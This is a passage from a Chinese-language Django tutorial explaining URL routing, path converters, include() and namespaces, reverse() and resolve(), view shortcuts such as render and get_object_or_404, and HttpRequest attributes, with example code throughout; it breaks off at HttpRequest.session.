关键字参数由表达式匹配的命名组组成,但可以被django.urls.path()的可选参数kwargs覆盖。
5、如果没有匹配到任何表达式或过程中抛出异常将调用一个适当的错误处理视图。

</pre><textarea>
from django.urls import path
from . import views
urlpatterns = [
    path('articles/2003/', views.special_case_2003),
    path('articles/< int:year>/', views.year_archive),
    path('articles/< int:year>/< int:month>/', views.month_archive),
    path('articles/< int:year>/< int:month>/< slug:slug>/', views.article_detail),
]

</textarea><pre>
要捕获一段url中的值,需要使用尖括号,而不是圆括号;
可以转换捕获到的值为指定类型比如int,默认情况下捕获到的结果保存为字符串类型,不包含/这个特殊字符;
匹配模式的最开头不需要添加/,因为默认情况下每个url都带一个最前面的/,既然大家都有的部分就不用浪费时间特别写一个了。

匹配例子:
/articles/2005/03/ 将匹配第三条,并调用views.month_archive(request, year=2005, month=3);
/articles/2003/匹配第一条,并调用views.special_case_2003(request);
/articles/2003将一条都匹配不上,因为它最后少了一个斜杠,而列表中的所有模式中都以斜杠结尾;
/articles/2003/03/building-a-django-site/将匹配最后一个,并调用views.article_detail(request, year=2003, month=3, slug="building-a-django-site"

每当urls.py文件被第一次加载的时候,urlpatterns里的表达式们都将被预先编译,这会大大提高系统处理路由的速度。

【 path转换器 】
默认情况下Django内置下面的路径转换器:
str:匹配任何非空字符串,但不含斜杠/,如果没有专门指定转换器则这个是默认使用的;
int:匹配0和正整数,返回一个int类型
slug:可理解为注释、后缀、附属等概念,是url拖在最后的一部分解释性字符,该转换器匹配任何ASCII字符及连接符和下划线,如building-your-1st-django-site;
uuid:匹配一个uuid格式的对象。为了防止冲突,规定必须使用破折号,所有字母必须小写,例如075194d3-6885-417e-a8a8-6c931e272f00。返回一个UUID对象;
path:匹配任何非空字符串,重点是可以包含路径分隔符/,这个转换器可以帮助匹配整个url而不是一段一段的url字符串。要区分path转换器和path()方法。

自定义path转换器
其实就是写一个类,并包含下面的成员和属性:
类属性regex:一个字符串形式的正则表达式属性;
to_python(self, value)方法:一个用来将匹配到的字符串转换为想要的那个数据类型,并传递给视图函数,如果转换失败必须弹出ValueError异常;
to_url(self, value)方法:将Python数据类型转换为一段url的方法,上面方法的反向操作。

</pre>例如新建一个converters.py文件,与urlconf同目录,写个下面的类<textarea>
class FourDigitYearConverter:
    regex = '[0-9]{4}'

    def to_python(self, value):
        return int(value)

    def to_url(self, value):
        return '%04d' % value

# 写完类后,在URLconf中注册并使用它
from django.urls import register_converter, path
from . import converters, views

register_converter(converters.FourDigitYearConverter, 'yyyy')

urlpatterns = [
    path('articles/2003/', views.special_case_2003),
    path('articles/< yyyy:year>/', views.year_archive),
    ...
]

</textarea><pre>
【 使用正则表达式 】
Django2.0的url虽然改配置了,但它依然向老版本兼容,而这个兼容的办法就是用re_path()代替path(),re_path()方法在骨子里根本就是以前的url(),只不过导入的位置变了。下面是一个例子,对比一下Django1.11时代的语法,有什么太大的差别？

</pre><textarea>
from django.urls import path, re_path
from . import views

urlpatterns = [
    path('articles/2003/', views.special_case_2003),
    re_path(r'^articles/(?P< year>[0-9]{4})/$', views.year_archive),
    re_path(r'^articles/(?P< year>[0-9]{4})/(?P< month>[0-9]{2})/$', views.month_archive),
    re_path(r'^articles/(?P< year>[0-9]{4})/(?P< month>[0-9]{2})/(?P< slug>[\w-]+)/$', views.article_detail),
]

</textarea><pre>
与path()方法不同的在于两点:
year中匹配不到10000等非四位数字,这是正则表达式决定的
传递给视图的所有参数都是字符串类型,而不像path()方法中可以指定转换成某种类型。在视图中接收参数时一定要小心。

URLconf匹配URL中的哪些部分
请求的URL被看做是一个普通的Python字符串,URLconf在其上查找并匹配,进行匹配时将不包括GET或POST请求方式的参数及域名。
在https://www.example.com/myapp/的请求中URLconf将查找myapp/
在https://www.example.com/myapp/?page=3的请求中URLconf也将查找myapp/
URLconf不检查使用何种HTTP请求方法,所有请求方法POST、GET、HEAD等都将路由到同一个URL的同一个视图,在视图中才根据具体请求方法的不同进行不同的处理

</pre>指定视图参数的默认值<textarea>
# URLconf
from django.urls import path
from . import views

urlpatterns = [
    path('blog/', views.page),
    path('blog/page< int:num>/', views.page),
]

# View (in blog/views.py)
def page(request, num=1):
    # Output the appropriate page of blog entries, according to num.
    ...

# 两个URL模式指向同一个视图views.page,但第一个模式不会从URL中捕获任何值;如果第一个模式匹配,page()函数将使用num参数的默认值"1"。 如果第二个模式匹配,page()将使用捕获的num值

</textarea><pre>
【 自定义错误页面 】
当Django找不到与请求匹配的URL或抛出一个异常时,将调用一个错误处理视图。Django默认的自带的错误视图包括400、403、404和500,分别表示请求错误、拒绝服务、页面不存在和服务器错误。它们分别位于:
handler400 —— django.conf.urls.handler400
handler403 —— django.conf.urls.handler403
handler404 —— django.conf.urls.handler404
handler500 —— django.conf.urls.handler500
这些值可以在根URLconf中设置,在其它app中的二级URLconf中设置这些变量无效。

Django有内置的HTML模版,用于返回错误页面给用户,但是这些403、404页面实在丑陋,通常都自定义错误页面。

</pre><textarea>
# 首先在根URLconf中额外增加下面的条目并导入views模块:
from django.contrib import admin
from django.urls import path
from app import views

urlpatterns = [
    path('admin/', admin.site.urls),
]

# 增加的条目
handler400 = views.bad_request
handler403 = views.permission_denied
handler404 = views.page_not_found
handler500 = views.error

# 然后在app/views.py文件中增加四个处理视图:
def bad_request(request):
    return render(request, '400.html')

def permission_denied(request):
    return render(request, '403.html')

def page_not_found(request):
    return render(request, '404.html')

def error(request):
    return render(request, '500.html')

# 再根据自己的需求,创建对应的400、403、404、500.html四个页面文件就可以了

</textarea><pre>
【 路由转发 】
通常会在每个app里各自创建一个urls.py路由模块,然后从根路由出发,将app所属的url请求全部转发到相应的urls.py模块中。

</pre><textarea>
from django.urls import include, path

urlpatterns = [
    path('community/', include('aggregator.urls')),
    path('contact/', include('contact.urls')),
]

</textarea><pre>
路由转发使用的是include()方法,需要提前导入,它的参数是转发目的地路径的字符串,路径以圆点分割。
每当Django遇到include()时,它会去掉URL中匹配的部分并将剩下的字符串发送给include的URLconf做进一步处理,也就是转发到二级路由去。

</pre>另外一种转发其它URL模式的方式是使用一个path()实例的列表<textarea>
from django.urls import include, path

from apps.main import views as main_views
from credit import views as credit_views

extra_patterns = [
    path('reports/', credit_views.report),
    path('reports/< int:id>/', credit_views.report),
    path('charge/', credit_views.charge),
]

urlpatterns = [
    path('', main_views.homepage),
    path('help/', include('apps.help.urls')),
    path('credit/', include(extra_patterns)),
]
在此示例中/credit/reports/URL将由credit_views.report()视图处理,这种做法相当于把二级路由模块内的代码写到根路由模块里一起了,不是很推荐

</textarea><textarea>
from django.urls import path
from . import views
urlpatterns = [
    path('< page_slug>-< page_id>/history/', views.history),
    path('< page_slug>-< page_id>/edit/', views.edit),
    path('< page_slug>-< page_id>/discuss/', views.discuss),
    path('< page_slug>-< page_id>/permissions/', views.permissions),
]

# 上面的路由写得不好,可以改进它,只需要声明共同的路径前缀一次,并将后面的部分分组转发:
from django.urls import include, path
from . import views
urlpatterns = [
    path('< page_slug>-< page_id>/', include([
        path('history/', views.history),
        path('edit/', views.edit),
        path('discuss/', views.discuss),
        path('permissions/', views.permissions),
    ])),
]

</textarea><pre>
【 捕获参数 】
目的地URLconf会收到来自父URLconf捕获的所有参数

</pre><textarea>
# In settings/urls/main.py
from django.urls import include, path

urlpatterns = [
    path('< username>/blog/', include('foo.urls.blog')),  # 捕获的"username"变量将被传递给include()指向的URLconf,再进一步传递给对应的视图
]

# In foo/urls/blog.py
from django.urls import path
from . import views

urlpatterns = [
    path('', views.blog.index),
    path('archive/', views.blog.archive),
]

</textarea><pre>
向视图传递额外的参数
URLconfs具有一个钩子(hook),允许传递一个Python字典作为额外的关键字参数给视图函数

</pre><textarea>
from django.urls import path
from . import views

urlpatterns = [
    path('blog/< int:year>/', views.year_archive, {'foo': 'bar'}),
]
# 对于/blog/2005/请求,Django将调用views.year_archive(request, year='2005', foo='bar')。理论上可以在这个字典里传递任何想要的传递的东西。但URL模式捕获的命名关键字参数和在字典中传递的额外参数有可能具有相同的名称,这会发生冲突,要避免。

</textarea><pre>
传递额外的参数给include()
类似上面,也可以传递额外的参数给include(),参数会传递给include指向的urlconf中的每一行。
只有当确定被include的URLconf中的每个视图都接收传递给它们的额外的参数时才有意义,否则其中一个以上视图不接收该参数都将导致错误异常。

</pre>下面两种URLconf配置方式在功能上完全相同<textarea>
配置一:
# main.py
from django.urls import include, path
urlpatterns = [
    path('blog/', include('inner'), {'blog_id': 3}),
]

# inner.py
from django.urls import path
from mysite import views

urlpatterns = [
    path('archive/', views.archive),
    path('about/', views.about),
]

配置二:
# main.py
from django.urls import include, path
from mysite import views

urlpatterns = [
    path('blog/', include('inner')),
]

# inner.py
from django.urls import path

urlpatterns = [
    path('archive/', views.archive, {'blog_id': 3}),
    path('about/', views.about, {'blog_id': 3}),
]

</textarea><pre>
【 反向解析URL 】
在实际的Django项目中经常需要获取某条URL,为生成的内容配置URL链接。

比如要在页面上展示一列文章列表,每个条目都是个超级链接,点击就进入该文章的详细页面。
现在urlconf配置为path('post/< int:pk>/',views.some_view),其中pk变量是视图函数的参数
在前端中需要为a标签的href属性提供一个诸如http://www.xxx.com/post/3/的值,其中的域名部分Django会自动添加,此时一定不能硬编码URL为post/3/,那样费时、不可伸缩容易出错,如果因为某种原因需要将urlconf中的表达式改成entry/< int:pk>/就必须修改对应的herf属性值,去项目里将所有的post/3/都改成entry/3/显然是不现实的
需要一种安全、可靠、自适应的机制,当修改URLconf中的代码后无需在项目源码中大范围搜索、替换失效的硬编码URL,为此Django提供了一种解决方案,只需在URL中提供一个name参数,并赋值一个自定义的、好记的、直观的字符串,通过这个name参数可以反向解析URL、反向URL匹配、反向URL查询或简单的URL反查。

在需要解析URL的地方,对于不同层级Django提供了不同的工具用于URL反查:
在模板语言中:使用url模板标签,也就是写前端网页时
在Python代码中:使用reverse()函数,也就是写视图函数等情况时
在更高层的与处理Django模型实例相关的代码中:使用get_absolute_url()方法,也就是在模型model中

</pre><textarea>
from django.urls import path
from . import views

urlpatterns = [
    path('articles/< int:year>/', views.year_archive, name='news-year-archive'),
]

# 2019年对应的归档URL是/articles/2019/,可以在模板的代码中使用下面的方法获得它们:
<a href="{% url 'news-year-archive' 2012 %}">2012 Archive</a>
{# Or with the year in a template context variable: #}
<ul>
{% for yearvar in year_list %}
<li><a href="{% url 'news-year-archive' yearvar %}">{{ yearvar }} Archive</a></li>
{% endfor %}
</ul>

# 在Python代码中这样使用:
from django.http import HttpResponseRedirect
from django.urls import reverse

def redirect_to_year(request):
    year = 2019
    return HttpResponseRedirect(reverse('news-year-archive', args=(year,)))

</textarea><pre>
其中起到核心作用的是通过name='news-year-archive'为那条url起了一个可以被引用的名称。
URL名称name使用的字符串可以包含任何字符,但有可能带来重名的冲突,比如两个不同的app在各自的urlconf中为某一条url取了相同的name,这就会带来麻烦。为了解决这个问题,又引出了下面的命名空间。

【 django.urls utility functions 】
1、reverse()
If you need to use something similar to the url template tag in your code, Django provides the following function:

reverse(viewname, urlconf=None, args=None, kwargs=None, current_app=None)
If no match can be made, reverse() raises a NoReverseMatch exception
viewname can be a URL pattern name or the callable view object. For example, given the following url:

</pre>reverse the URL 反转url<textarea>
from news import views
path('archive/', views.archive, name='news-archive')

# using the named URL
>>> reverse('news-archive')
'/archive/'

# passing a callable object,This is discouraged because you can't reverse namespaced views this way
>>> from news import views
>>> reverse(views.archive)
'/archive/'

# If the URL accepts arguments, you may pass them in args:
from django.urls import reverse
def myview(request):
    return HttpResponseRedirect(reverse('arch-summary', args=[1945]))

# You can also pass kwargs instead of args,args and kwargs cannot be passed to reverse() at the same time
>>> reverse('admin:app_list', kwargs={'app_label': 'auth'})
'/admin/auth/'

# The string returned by reverse() is already urlquoted. For example:
# Applying further encoding (such as urllib.parse.quote()) to the output of reverse() may produce undesirable results.
>>> reverse('cities', args=['Orléans'])
'.../Orl%C3%A9ans/'

</textarea><pre>
The reverse() function can reverse a large variety of regular expression patterns for URLs, but not every possible one. The main restriction at the moment is that the pattern cannot contain alternative choices using the vertical bar ("|") character. You can quite happily use such patterns for matching against incoming URLs and sending them off to views, but you cannot reverse such patterns.

The current_app argument allows you to provide a hint to the resolver indicating the application to which the currently executing view belongs. This current_app argument is used as a hint to resolve application namespaces into URLs on specific application instances, according to the namespaced URL resolution strategy.

The urlconf argument is the URLconf module containing the URL patterns to use for reversing. By default, the root URLconf for the current thread is used.

</pre><textarea>
# 总urls.py如下：
from django.contrib import admin
from django.urls import path, include

from myblog import views
urlpatterns = [
    path('admin/', admin.site.urls),
    path('', views.index),
    path('myblog/', include('myblog.urls')),
]

# APP中的urls.py如下：
from django.urls import path
from .views import *

# app_name = 'myblog'  # 添加url命名空间myblog

urlpatterns = [
    path('login/', login, name='login'),
    # http://127.0.0.1:8000/myblog/detail/1/2/ 传参article_id和eid
    path('detail/<article_id>/<eid>/', article_detail, name='detail'),
]

# APP下的views.py文件：
from django.shortcuts import render, reverse, redirect
from django.http import HttpResponse

def index(request):
    # 判断用户是否登录,有用户名跳到首页,没有跳到登录页面
    username = request.GET.get('username')
    if username:
        return HttpResponse("首页")
    else:
        # 1.写死的话, 修改代码时需要把所有路径找出来改成新的路径
        # login_url = 'myblog/login/'
        # 2、利用reverse函数反转url：找到urls.py中name='login'的路径
        # login_url = reverse('login')        # myblog.urls没有添加命名空间
        # login_url = reverse('myblog:login') # myblog.urls添加了myblog命名空间之后
        # 3、当reverse需要传参时
        login_url = reverse('detail', kwargs={'article_id': 1, 'eid': 2})        # myblog.urls没有添加命名空间
        login_url = reverse('myblog:detail', kwargs={'article_id': 1, 'eid': 2}) # myblog.urls添加了myblog命名空间之后
        return redirect(login_url)
def login(request):
    return HttpResponse("登录页面")

def article_detail(request, article_id, eid):
    text = '您的文章ID+eid是： %s' % article_id, eid
    return HttpResponse(text)

</textarea><pre>
2、reverse_lazy()
reverse_lazy(viewname, urlconf=None, args=None, kwargs=None, current_app=None)
A lazily evaluated version of reverse().
It is useful for when you need to use a URL reversal before your project's URLConf is loaded. Some common cases where this function is necessary are:

providing a reversed URL as the url attribute of a generic class-based view.
providing a reversed URL to a decorator (such as the login_url argument for the django.contrib.auth.decorators.permission_required() decorator).
providing a reversed URL as a default value for a parameter in a function's signature.

3、resolve()
The resolve() function can be used for resolving URL paths to the corresponding view functions. It has the following signature:

resolve(path, urlconf=None)
path is the URL path you want to resolve. As with reverse(), you don't need to worry about the urlconf parameter. The function returns a ResolverMatch object that allows you to access various metadata about the resolved URL.

If the URL does not resolve, the function raises a Resolver404 exception (a subclass of Http404) .

class ResolverMatch
func
The view function that would be used to serve the URL

args
The arguments that would be passed to the view function, as parsed from the URL.

kwargs
The keyword arguments that would be passed to the view function, as parsed from the URL.

url_name
The name of the URL pattern that matches the URL.

route
The route of the matching URL pattern.
For example, if path('users/< id>/', ...) is the matching pattern, route will contain 'users/< id>/'.

app_name
The application namespace for the URL pattern that matches the URL.

app_names
The list of individual namespace components in the full application namespace for the URL pattern that matches the URL. For example, if the app_name is 'foo:bar', then app_names will be ['foo', 'bar'].

namespace
The instance namespace for the URL pattern that matches the URL.

namespaces
The list of individual namespace components in the full instance namespace for the URL pattern that matches the URL. i.e., if the namespace is foo:bar, then namespaces will be ['foo', 'bar'].

view_name
The name of the view that matches the URL, including the namespace if there is one.

</pre><textarea>
# A ResolverMatch object can then be interrogated to provide information about the URL pattern that matches a URL:

# Resolve a URL
match = resolve('/some/path/')
# Print the URL pattern that matches the URL
print(match.url_name)

# A ResolverMatch object can also be assigned to a triple:
func, args, kwargs = resolve('/some/path/')

# One possible use of resolve() would be to test whether a view would raise a Http404 error before redirecting to it:
from urllib.parse import urlparse
from django.urls import resolve
from django.http import Http404, HttpResponseRedirect

def myview(request):
    next = request.META.get('HTTP_REFERER', None) or '/'
    response = HttpResponseRedirect(next)

    # modify the request and response as required, e.g. change locale and set corresponding locale cookie

    view, args, kwargs = resolve(urlparse(next)[2])
    kwargs['request'] = request
    try:
        view(*args, **kwargs)
    except Http404:
        return HttpResponseRedirect('/')
    return response

</textarea><pre>
4、get_script_prefix()
Normally, you should always use reverse() to define URLs within your application. However, if your application constructs part of the URL hierarchy itself, you may occasionally need to generate URLs. In that case, you need to be able to find the base URL of the Django project within its Web server (normally, reverse() takes care of this for you). In that case, you can call get_script_prefix(), which will return the script prefix portion of the URL for your Django project. If your Django project is at the root of its web server, this is always "/".

</pre><pre>
【 URL命名空间 】
URL命名空间可以保证反查到唯一的URL,即使不同的app使用相同的URL名称,第三方应用始终使用带命名空间的URL是一个很好的做法。
类似地,它还允许在一个应用有多个实例部署的情况下反查URL。 换句话讲,因为一个应用的多个实例共享相同的命名URL,命名空间提供了一种区分这些命名URL的方法。

实现命名空间的做法很简单,在urlconf文件中添加app_name = 'polls'和namespace='author-polls'这种类似的定义。

</pre>以polls应用的两个实例'publisher-polls' 和'author-polls'为例,假设已经在创建和显示投票时考虑了实例命名空间的问题<textarea>
# urls.py
from django.urls import include, path
urlpatterns = [
    path('author-polls/', include('polls.urls', namespace='author-polls')),
    path('publisher-polls/', include('polls.urls', namespace='publisher-polls')),
]

# polls/urls.py
from django.urls import path
from . import views
app_name = 'polls'
urlpatterns = [
    path('', views.IndexView.as_view(), name='index'),
    path('< int:pk>/', views.DetailView.as_view(), name='detail'),
]

</textarea><pre>
如果当前的app实例是其中的一个,例如正在渲染实例'author-polls'中的detail视图,'polls:index'将解析到'author-polls'实例的index视图。

根据以上设置,可以使用下面的查询:
在基于类的视图的方法中:
reverse('polls:index', current_app=self.request.resolver_match.namespace)
和在模板中:
{% url 'polls:index' %}

如果没有当前app实例,例如如果在站点的其它地方渲染一个页面,'polls:index'将解析到polls注册的最后一个app实例空间。 因为没有默认的实例(命名空间为'polls'的实例),将使用注册的polls的最后一个实例。 这将是'publisher-polls',因为它是在urlpatterns中最后一个声明的。

URL命名空间和include的URLconf
可以通过两种方式指定include的URLconf的应用名称空间。

第一种
在include的URLconf模块中设置与urlpatterns属性相同级别的app_name属性。必须将实际模块或模块的字符串引用传递到include(),而不是urlpatterns本身的列表。

</pre><textarea>
# polls/urls.py:
from django.urls import path
from . import views

app_name = 'polls'
urlpatterns = [
    path('', views.IndexView.as_view(), name='index'),
    path('< int:pk>/', views.DetailView.as_view(), name='detail'),
]

# urls.py:
from django.urls import include, path
urlpatterns = [
    path('polls/', include('polls.urls')),
]

# 此时polls.urls中定义的URL将具有应用名称空间polls。

</textarea><pre>
第二种
include一个包含嵌套命名空间数据的对象,格式如下:
(< list of path()/re_path() instances>, < application namespace>)

</pre><textarea>
from django.urls import include, path
from . import views

polls_patterns = ([
    path('', views.IndexView.as_view(), name='index'),
    path('< int:pk>/', views.DetailView.as_view(), name='detail'),
], 'polls')

urlpatterns = [
    path('polls/', include(polls_patterns)),
]

# 这将include指定的URL模式到给定的app命名空间。

</textarea><pre>
可以使用include()的namespace参数指定app实例命名空间。如果未指定,则app实例命名空间默认为URLconf的app命名空间。

【 视图函数及快捷方式 】
视图函数简称视图,本质上是一个简单的Python函数,它接受Web请求并且返回Web响应。
响应的内容可以是HTML网页、重定向、404错误,XML文档或图像等任何东西,但无论视图本身是个什么处理逻辑,最好都返回某种响应。
视图函数的代码写在哪里也无所谓,只要它在Python目录下面,但通常约定将视图放置在项目或应用程序目录中的名为views.py的文件中。

</pre>简单的视图:下面是一个返回当前日期和时间作为HTML文档的视图<textarea>
# 从django.http模块导入了HttpResponse类,以及Python的datetime库
from django.http import HttpResponse
import datetime

# 定义了current_datetime视图函数,每个视图函数都接收一个HttpRequest对象作为第一位置参数,一般取名为request,该视图返回一个HttpResponse对象,其中包含生成的HTML页面。
def current_datetime(request):
    now = datetime.datetime.now()
    html = "< html>< body>It is now %s.< /body>< /html>" % now
    return HttpResponse(html)

</textarea><pre>
返回错误
在Django中返回HTTP错误代码是非常简单的。
HttpResponse的许多子类对应着除了200(代表"OK")以外的一些常用的HTTP状态码。
为了标示一个错误,可以直接返回那些子类中的一个实例,而不是普通的HttpResponse
Django为404错误提供了一个特化的子类HttpResponseNotFound。由于一些状态码不太常用,所以不是每个状态码都有一个特化的子类。

</pre><textarea>
from django.http import HttpResponse, HttpResponseNotFound
def my_view(request):
    if foo:
        return HttpResponseNotFound('< h1>Page not found< /h1>')
    else:
        return HttpResponse('< h1>Page was found< /h1>')

# 也可以向HttpResponse的构造器传递HTTP状态码,来创建想要的任何状态码的返回类
from django.http import HttpResponse
def my_view(request):
    return HttpResponse(status=201)  # Return a "created" (201) response code.

</textarea><pre>
Http404异常
class django.http.Http404
这是一个Django内置的异常类。可以在需要的地方认为弹出它,Django会捕获它,并且带上HTTP404错误码返回当前app的标准错误页面或自定义错误页面
为了在Django返回404时显示自定义的HTML,可以创建一个名为404.html的HTML模板,并将其放置在模板树的顶层。 当DEBUG设置为False时,此模板将被自动使用。当DEBUG为True时,可以向Http404提供消息,它将显示在标准的内置404调试模板中,可以使用这些消息进行调试。

</pre><textarea>
from django.http import Http404
from django.shortcuts import render
from polls.models import Poll

def detail(request, poll_id):
    try:
        p = Poll.objects.get(pk=poll_id)
    except Poll.DoesNotExist:
        raise Http404("Poll does not exist")
    return render(request, 'polls/detail.html', {'poll': p})

</textarea><pre>
【 Django内置的快捷方法 】
Django在django.shortcuts模块中提供了很多快捷方便的类和方法

1. render()
render(request, template_name, context=None, content_type=None, status=None, using=None)
结合一个给定的模板和一个给定的上下文字典,返回一个渲染后的HttpResponse对象。

必需参数:
request:视图函数处理的当前请求,封装了请求头的所有数据,其实就是视图参数request。
template_name:要使用的模板的完整名称或模板名称的列表,如果是一个列表将使用其中能够查找到的第一个模板。

可选参数:
context:添加到模板上下文的一个数据字典,默认是一个空字典。可以将认可需要提供给模板的数据以字典的格式添加进去,使用Python内置的locals()方法可以方便的将函数作用于内的所有变量一次性添加。
content_type:用于生成的文档的MIME类型,默认为DEFAULT_CONTENT_TYPE设置的值。
status:响应的状态代码,默认为200。
using:用于加载模板使用的模板引擎的NAME。

</pre>渲染模板myapp/index.html,MIME类型为application/xhtml+xml<textarea>
from django.shortcuts import render

def my_view(request):
    # View code here...
    return render(request, 'myapp/index.html', { 'foo': 'bar' }, content_type='application/xhtml+xml')

# 等同于:
from django.http import HttpResponse
from django.template import loader

def my_view(request):
    t = loader.get_template('myapp/index.html')
    c = {'foo': 'bar'}
    return HttpResponse(t.render(c, request), content_type='application/xhtml+xml')

</textarea><pre>
2. redirect()
redirect(to, *args, permanent=False, **kwargs)
根据传递进来的url参数,返回HttpResponseRedirect。默认情况下是临时重定向,如果设置permanent=True将永久重定向。

参数to可以是:
一个模型:将调用模型的get_absolute_url()函数,反向解析出目的url;
一个视图,可以带有函数:可能带有参数:可以使用urlresolvers.reverse来反向解析名称
一个绝对的或相对的URL:将原封不动的作为重定向的目标位置。

</pre><textarea>
1.传递一个具体的ORM对象,将调用具体ORM对象的get_absolute_url()方法来获取重定向的URL
from django.shortcuts import redirect
def my_view(request):
    ...
    object = MyModel.objects.get(...)
    return redirect(object)

2.传递视图名,使用reverse()方法反向解析url:
def my_view(request):
    ...
    return redirect('some-view-name', foo='bar')

3、重定向到硬编码的URL或一个完整的UR:
def my_view(request):
    ...
    return redirect('/some/url/')
    return redirect('https://example.com/')

所有上述形式都接受permanent参数;如果设置为True,将返回永久重定向:
def my_view(request):
    ...
    object = MyModel.objects.get(...)
    return redirect(object, permanent=True)

</textarea><pre>
3. get_object_or_404()
get_object_or_404(klass, *args, **kwargs)
这个方法非常有用,常用于查询某个对象,找到了则进行下一步处理,如果未找到则给用户返回404页面。
在后台Django其实是调用了模型管理器的get()方法,只会返回一个对象。不同的是,如果get()发生异常会引发Http404异常,从而返回404页面,而不是模型的DoesNotExist异常。

必需参数:
klass:要获取的对象的Model类名、Manager或Queryset等;
**kwargs:查询的参数,格式应该可以被get()和filter()接受

</pre><textarea>
1.从MyModel中使用主键1来获取对象:
from django.shortcuts import get_object_or_404
def my_view(request):
    my_object = get_object_or_404(MyModel, pk=1)

# 等同于:
from django.http import Http404
def my_view(request):
    try:
        my_object = MyModel.objects.get(pk=1)
    except MyModel.DoesNotExist:
        raise Http404("No MyModel matches the given query.")

2.除了传递Model名称,还可以传递一个QuerySet实例,但如果queryset来自其它地方,它就会很有用了。
queryset = Book.objects.filter(title__startswith='M')
get_object_or_404(queryset, pk=1)
等同于:
get_object_or_404(Book, title__startswith='M', pk=1)

3.还可以使用Manager,如果自定义了管理器,这将很有用:
get_object_or_404(Book.dahl_objects, title='Matilda')

4.还可以使用related managers:
author = Author.objects.get(name='Roald Dahl')
get_object_or_404(author.book_set, title='Matilda')
与get()一样,如果找到多个对象将引发一个MultipleObjectsReturned异常。

</textarea><pre>
5. get_list_or_404()
get_list_or_404(klass, *args, **kwargs)
这其实就是get_object_or_404多值获取版本。
在后台返回一个给定模型管理器上filter()的结果,并将结果映射为一个列表,如果结果为空则弹出Http404异常。

必需参数:
klass:获取该列表的一个Model、Manager或QuerySet实例。
**kwargs:查询的参数,格式应该可以被filter()接受。

</pre><textarea>
下面的示例从MyModel中获取所有发布出来的对象:
from django.shortcuts import get_list_or_404
def my_view(request):
    my_objects = get_list_or_404(MyModel, published=True)

# 等同于:
from django.http import Http404
def my_view(request):
    my_objects = list(MyModel.objects.filter(published=True))
    if not my_objects:
        raise Http404("No MyModel matches the given query.")

</textarea>
</div>

<div id="django_request">
<h4>HttpRequest对象</h4><pre>
每当一个用户请求发送过来,Django将HTTP数据包中的相关内容打包成为一个HttpRequest对象,并传递给每个视图函数作为第一位置参数即request供调用。

HttpRequest对象中包含了非常多的重要的信息和数据
类定义:class HttpRequest

一、属性
HttpRequest对象的大部分属性是只读的,除非特别注明。

1. HttpRequest.scheme
字符串类型,表示请求的协议种类,'http'或'https'。

2. HttpRequest.body
bytes类型,表示原始HTTP请求的正文。它对于处理非HTML形式的数据非常有用:二进制图像、XML等。如果要处理常规的表单数据应该使用HttpRequest.POST。
还可以使用类似读写文件的方式从HttpRequest中读取数据,参见HttpRequest.read()。

3. HttpRequest.path
字符串类型,表示当前请求页面的完整路径,但是不包括协议名和域名,如"/music/bands/the_beatles/"。这个属性常被用于进行某项操作时如果不通过则返回用户先前浏览的页面

4. HttpRequest.path_info
在某些Web服务器配置下,主机名后的URL部分被分成脚本前缀部分和路径信息部分。path_info属性将始终包含路径信息部分,不论使用的Web服务器是什么。使用它代替path可以让代码在测试和开发环境中更容易地切换。
例如如果应用的WSGIScriptAlias设置为/minfo,那么HttpRequest.path等于/music/bands/the_beatles/,而HttpRequest.path_info为/minfo/music/bands/the_beatles/

5. HttpRequest.method
字符串类型,表示请求使用的HTTP方法。默认为大写
if request.method == 'GET': do_something()
elif request.method == 'POST': do_something_else()
通过这个属性来判断请求的方法,然后根据请求的方法不同在视图中执行不同的代码。

6. HttpRequest.encoding
字符串类型,表示提交的数据的编码方式,如果为None则表示使用DEFAULT_CHARSET设置,这个属性是可写的,可以通过修改它来改变表单数据的编码。任何随后的属性访问例如GET或POST将使用新的编码方式。

7. HttpRequest.content_type
表示从CONTENT_TYPE头解析的请求的MIME类型。

8. HttpRequest.content_params
包含在CONTENT_TYPE标题中的键/值参数字典。

9 HttpRequest.GET
一个类似于字典的对象,包含GET请求中的所有参数,参考QueryDict

10. HttpRequest.POST
一个包含所有POST请求的参数及包含表单数据的字典,参考QueryDict,如果需要访问请求中的原始或非表单数据可以使用HttpRequest.body属性。
使用if request.method == "POST"来判断一个请求是否POST类型,而不要使用if request.POST。
POST中不包含上传文件的数据。

11. HttpRequest.COOKIES
包含所有Cookie信息的字典,键和值都为字符串。可以类似字典类型的方式在cookie中读写数据,但cookie是不安全的,因此不要写敏感重要的信息。

12. HttpRequest.FILES
一个类似于字典的对象,包含所有上传的文件数据。 FILES中的每个键为< input type="file" name="" />中的name属性值。 FILES中的每个值是一个UploadedFile。
如果请求方法是POST且请求的< form>中带有enctype="multipart/form-data"属性,那么FILES将包含上传的文件的数据。 否则FILES将为一个空的类似于字典的对象,属于被忽略、无用的情形。

13. HttpRequest.META
包含所有HTTP头部信息的字典,可用的头部信息取决于客户端和服务器,下面是一些示例:
CONTENT_LENGTH —— 请求正文的长度(以字符串计)。
CONTENT_TYPE —— 请求正文的MIME类型。
HTTP_ACCEPT —— 可接收的响应Content-Type。
HTTP_ACCEPT_ENCODING —— 可接收的响应编码类型。
HTTP_ACCEPT_LANGUAGE —— 可接收的响应语言种类。
HTTP_HOST —— 客服端发送的Host头部。
HTTP_REFERER —— Referring页面。
HTTP_USER_AGENT —— 客户端的user-agent字符串。
QUERY_STRING —— 查询字符串。
REMOTE_ADDR —— 客户端的IP地址。想要获取客户端的ip信息,就在这里！
REMOTE_HOST —— 客户端的主机名。
REMOTE_USER —— 服务器认证后的用户,如果可用。
REQUEST_METHOD —— 表示请求方法的字符串,例如"GET" 或"POST"。
SERVER_NAME —— 服务器的主机名。
SERVER_PORT —— 服务器的端口(字符串)

从上面可以看到,除CONTENT_LENGTH和CONTENT_TYPE之外,请求中的任何HTTP头部键转换为META键时都会将所有字母大写并将连接符替换为下划线最后加上HTTP_前缀。所以一个叫做X-Bender的头部将转换成META中的HTTP_X_BENDER键。

return redirect(request.META.get('HTTP_REFERER', '/'))

13. HttpRequest.resolver_match
代表一个已解析的URL的ResolverMatch实例。

二、可自定义的属性
Django不会自动设置下面这些属性,而是由自己在应用程序中设置并使用它们。

1. HttpRequest.current_app
表示当前app的名字,url模板标签将使用其值作为reverse()方法的current_app参数。

2. HttpRequest.urlconf
设置当前请求的根URLconf,用于指定不同的url路由进入口,这将覆盖settings中的ROOT_URLCONF设置。
将它的值修改为None,可以恢复使用ROOT_URLCONF设置。

三、由中间件设置的属性
Django的contrib应用中包含的一些中间件会在请求上设置属性。

1. HttpRequest.session
